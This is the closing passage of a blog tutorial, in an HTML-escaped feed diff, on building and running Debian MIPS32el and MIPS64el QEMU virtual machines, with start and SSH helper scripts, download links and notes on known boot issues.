+&lt;span class="c1"&gt;# shutdown -h now&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;You can now use the &lt;code&gt;start.sh&lt;/code&gt; script to init the VM, and &lt;code&gt;ssh.sh&lt;/code&gt; to SSH to it
+as &lt;code&gt;user&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;The &lt;code&gt;start.sh&lt;/code&gt; usually looks like&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="ch"&gt;#!/bin/bash&lt;/span&gt;
+
+&lt;span class="nv"&gt;KERNEL&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;./vmlinux-4.9.0-4-5kc-malta
+&lt;span class="nv"&gt;INITRD&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;./initrd.img-4.9.0-4-5kc-malta
+&lt;span class="nv"&gt;HDD&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;./disk.qcow2
+&lt;span class="nv"&gt;SSH_PORT&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;22055&lt;/span&gt;
+&lt;span class="nv"&gt;EXTRA_PORT&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;33055&lt;/span&gt;
+
+qemu-system-mips64el&lt;span class="w"&gt; &lt;/span&gt;-M&lt;span class="w"&gt; &lt;/span&gt;malta&lt;span class="w"&gt; &lt;/span&gt;-m&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;512&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;-cpu&lt;span class="w"&gt; &lt;/span&gt;MIPS64R2-generic&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="se"&gt;\&lt;/span&gt;
+&lt;span class="w"&gt;                   &lt;/span&gt;-kernel&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;KERNEL&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="se"&gt;\&lt;/span&gt;
+&lt;span class="w"&gt;                   &lt;/span&gt;-initrd&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;INITRD&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="se"&gt;\&lt;/span&gt;
+&lt;span class="w"&gt;                   &lt;/span&gt;-hda&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;HDD&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="se"&gt;\&lt;/span&gt;
+&lt;span class="w"&gt;                   &lt;/span&gt;-net&lt;span class="w"&gt; &lt;/span&gt;nic,model&lt;span class="o"&gt;=&lt;/span&gt;e1000&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="se"&gt;\&lt;/span&gt;
+&lt;span class="w"&gt;                   &lt;/span&gt;-net&lt;span class="w"&gt; &lt;/span&gt;user,hostfwd&lt;span class="o"&gt;=&lt;/span&gt;tcp:127.0.0.1:&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;SSH_PORT&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;-:22,hostfwd&lt;span class="o"&gt;=&lt;/span&gt;tcp:127.0.0.1:&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;EXTRA_PORT&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;-:4444&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="se"&gt;\&lt;/span&gt;
+&lt;span class="w"&gt;                   &lt;/span&gt;-display&lt;span class="w"&gt; &lt;/span&gt;none&lt;span class="w"&gt; &lt;/span&gt;-vga&lt;span class="w"&gt; &lt;/span&gt;none&lt;span class="w"&gt; &lt;/span&gt;-nographic&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="se"&gt;\&lt;/span&gt;
+&lt;span class="w"&gt;                   &lt;/span&gt;-append&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;nokaslr root=/dev/sda1 console=ttyS0&amp;#39;&lt;/span&gt;
+
+&lt;span class="nb"&gt;exit&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;And the &lt;code&gt;ssh.sh&lt;/code&gt;:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="ch"&gt;#!/bin/sh&lt;/span&gt;
+&lt;span class="nb"&gt;echo&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Existing users : &amp;#39;root/root&amp;#39; &amp;amp; &amp;#39;user/user&amp;#39;&amp;quot;&lt;/span&gt;
+ssh&lt;span class="w"&gt; &lt;/span&gt;-o&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;UserKnownHostsFile&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/dev/null&lt;span class="w"&gt; &lt;/span&gt;-o&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;StrictHostKeyChecking&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;no&lt;span class="w"&gt; &lt;/span&gt;-p&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;22055&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;user@127.0.0.1&lt;span class="w"&gt; &lt;/span&gt;--&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;$*&lt;/span&gt;
+&lt;span class="nb"&gt;exit&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;For Windows, simply convert &lt;code&gt;script.sh&lt;/code&gt; to Batch.&lt;/p&gt;
+&lt;h3&gt;Download the new images&lt;/h3&gt;
+&lt;p&gt;Since I've built in parallel a Malta MIPS32el and MIPS64el for this tutorial,
+both have been added to the &lt;a href="https://mega.nz/#F!oMoVzQaJ!iS73iiQQ3t_6HuE-XpnyaA" target="_blank"&gt;folder on Mega.nz&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;The MIPS64el was created &lt;strong&gt;exactly&lt;/strong&gt; the same way, except that QEMU required the
+proper CPU version to boot correctly:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$&lt;span class="w"&gt; &lt;/span&gt;qemu-system-mips64el&lt;span class="w"&gt; &lt;/span&gt;-M&lt;span class="w"&gt; &lt;/span&gt;malta&lt;span class="w"&gt; &lt;/span&gt;-cpu&lt;span class="w"&gt; &lt;/span&gt;MIPS64R2-generic&lt;span class="w"&gt; &lt;/span&gt;-m&lt;span class="w"&gt; &lt;/span&gt;1G&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="se"&gt;\&lt;/span&gt;
+&lt;span class="w"&gt;  &lt;/span&gt;-hda&lt;span class="w"&gt; &lt;/span&gt;./disk.qcow2&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="se"&gt;\&lt;/span&gt;
+&lt;span class="w"&gt;  &lt;/span&gt;-initrd&lt;span class="w"&gt; &lt;/span&gt;./initrd.gz&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="se"&gt;\&lt;/span&gt;
+&lt;span class="w"&gt;  &lt;/span&gt;-kernel&lt;span class="w"&gt; &lt;/span&gt;./vmlinux-4.9.0-4-5kc-malta&lt;span class="w"&gt; &lt;/span&gt;-append&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;nokaslr&amp;quot;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="se"&gt;\&lt;/span&gt;
+&lt;span class="w"&gt;  &lt;/span&gt;-nographic
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;The adequate files were downloaded from
+&lt;a href="http://ftp.debian.org/debian/dists/"&gt;here&lt;/a&gt;, then choose your wanted version (here, &lt;code&gt;Debian9.13&lt;/code&gt;) and go to &lt;code&gt;main/installer-mips64el&lt;/code&gt; to download the installer files.&lt;/p&gt;
+&lt;h3&gt;A few known issues&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;The kernel doesn't boot the &lt;code&gt;initrd&lt;/code&gt;: from my experience on it, either your
+    initrd is incorrect, or try to append proper kernel boot options
+    (&lt;code&gt;-append&lt;/code&gt;).&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;The error &lt;code&gt;WARNING: I/O thread spun for 1000 iterations&lt;/code&gt; appears often:
+    that's a QEMU warning from
+    &lt;a href="https://github.com/qemu/qemu/blob/master/util/main-loop.c#L219"&gt;&lt;code&gt;os_host_main_loop_wait()&lt;/code&gt;&lt;/a&gt; and
+    the code provides a good description of the issue:&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;/**&lt;span class="w"&gt; &lt;/span&gt;If&lt;span class="w"&gt; &lt;/span&gt;the&lt;span class="w"&gt; &lt;/span&gt;I/O&lt;span class="w"&gt; &lt;/span&gt;thread&lt;span class="w"&gt; &lt;/span&gt;is&lt;span class="w"&gt; &lt;/span&gt;very&lt;span class="w"&gt; &lt;/span&gt;busy&lt;span class="w"&gt; &lt;/span&gt;or&lt;span class="w"&gt; &lt;/span&gt;we&lt;span class="w"&gt; &lt;/span&gt;are&lt;span class="w"&gt; &lt;/span&gt;incorrectly&lt;span class="w"&gt; &lt;/span&gt;busy&lt;span class="w"&gt; &lt;/span&gt;waiting&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;in&lt;/span&gt;
+&lt;span class="w"&gt;  &lt;/span&gt;*&lt;span class="w"&gt; &lt;/span&gt;the&lt;span class="w"&gt; &lt;/span&gt;I/O&lt;span class="w"&gt; &lt;/span&gt;thread,&lt;span class="w"&gt; &lt;/span&gt;this&lt;span class="w"&gt; &lt;/span&gt;can&lt;span class="w"&gt; &lt;/span&gt;lead&lt;span class="w"&gt; &lt;/span&gt;to&lt;span class="w"&gt; &lt;/span&gt;starvation&lt;span class="w"&gt; &lt;/span&gt;of&lt;span class="w"&gt; &lt;/span&gt;the&lt;span class="w"&gt; &lt;/span&gt;BQL&lt;span class="w"&gt; &lt;/span&gt;such&lt;span class="w"&gt; &lt;/span&gt;that&lt;span class="w"&gt; &lt;/span&gt;the
+&lt;span class="w"&gt;  &lt;/span&gt;*&lt;span class="w"&gt; &lt;/span&gt;VCPU&lt;span class="w"&gt; &lt;/span&gt;threads&lt;span class="w"&gt; &lt;/span&gt;never&lt;span class="w"&gt; &lt;/span&gt;run.&lt;span class="w"&gt;  &lt;/span&gt;To&lt;span class="w"&gt; &lt;/span&gt;make&lt;span class="w"&gt; &lt;/span&gt;sure&lt;span class="w"&gt; &lt;/span&gt;we&lt;span class="w"&gt; &lt;/span&gt;can&lt;span class="w"&gt; &lt;/span&gt;detect&lt;span class="w"&gt; &lt;/span&gt;the&lt;span class="w"&gt; &lt;/span&gt;later&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;case&lt;/span&gt;,
+&lt;span class="w"&gt;  &lt;/span&gt;*&lt;span class="w"&gt; &lt;/span&gt;print&lt;span class="w"&gt; &lt;/span&gt;a&lt;span class="w"&gt; &lt;/span&gt;message&lt;span class="w"&gt; &lt;/span&gt;to&lt;span class="w"&gt; &lt;/span&gt;the&lt;span class="w"&gt; &lt;/span&gt;screen.&lt;span class="w"&gt;  &lt;/span&gt;If&lt;span class="w"&gt; &lt;/span&gt;we&lt;span class="w"&gt; &lt;/span&gt;run&lt;span class="w"&gt; &lt;/span&gt;into&lt;span class="w"&gt; &lt;/span&gt;this&lt;span class="w"&gt; &lt;/span&gt;condition,&lt;span class="w"&gt; &lt;/span&gt;create
+&lt;span class="w"&gt;  &lt;/span&gt;*&lt;span class="w"&gt; &lt;/span&gt;a&lt;span class="w"&gt; &lt;/span&gt;fake&lt;span class="w"&gt; &lt;/span&gt;timeout&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;in&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;order&lt;span class="w"&gt; &lt;/span&gt;to&lt;span class="w"&gt; &lt;/span&gt;give&lt;span class="w"&gt; &lt;/span&gt;the&lt;span class="w"&gt; &lt;/span&gt;VCPU&lt;span class="w"&gt; &lt;/span&gt;threads&lt;span class="w"&gt; &lt;/span&gt;a&lt;span class="w"&gt; &lt;/span&gt;chance&lt;span class="w"&gt; &lt;/span&gt;to&lt;span class="w"&gt; &lt;/span&gt;run.
+&lt;span class="w"&gt;  &lt;/span&gt;*/
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+&lt;li&gt;For simplicity, I highly recommend to only use the official repo (from
+    &lt;code&gt;deb.debian.org&lt;/code&gt; or &lt;code&gt;mirrors.kernel.org&lt;/code&gt;). It might be a bit slower than
+    your local mirror, but mirrors do not always mirror &lt;strong&gt;all&lt;/strong&gt; the
+    architectures generated by Debian maintainers.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3&gt;Conclusion&lt;/h3&gt;
+&lt;p&gt;That's how you get started with making your own QEMU images. Debian, as the real
+hacker distro it is, is usually the one that works best for trying weird
+combination, and MIPS CPUs are very well supported. More posts will come on
+building other QEMU images for other ABI, which are not necessarily that easy to
+setup.&lt;/p&gt;
+&lt;p&gt;I hope you now have all the information to make your own QEMU images.
+Thanks for reading!&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;em&gt;Note&lt;/em&gt; (2017-11-15): links updated
+&lt;/p&gt;
+&lt;/blockquote&gt;</content><category term="tutorial"></category><category term="howto"></category><category term="qemu"></category><category term="mipsel"></category><category term="mips64el"></category></entry></feed>
